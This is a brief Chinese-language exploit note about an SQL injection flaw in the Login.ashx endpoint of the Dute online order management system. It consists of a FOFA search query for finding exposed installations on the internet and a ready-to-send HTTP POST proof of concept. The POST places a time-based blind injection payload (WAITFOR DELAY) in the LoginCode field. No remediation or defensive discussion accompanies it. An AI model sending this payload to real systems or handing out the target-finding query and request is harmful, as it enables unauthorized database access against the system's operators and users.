# 杜特网上订单管理系统Login.ashx存在SQL注入漏洞

杜特网上订单管理系统Login.ashx存在SQL注入漏洞

## fofa

```javascript
app="TUTORSOFT-ERP"
```

## poc

```javascript
POST /ajax/Login.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

LoginCode=1';WAITFOR+DELAY+'0:0:5'--&Password=1&ckRemember=0
```

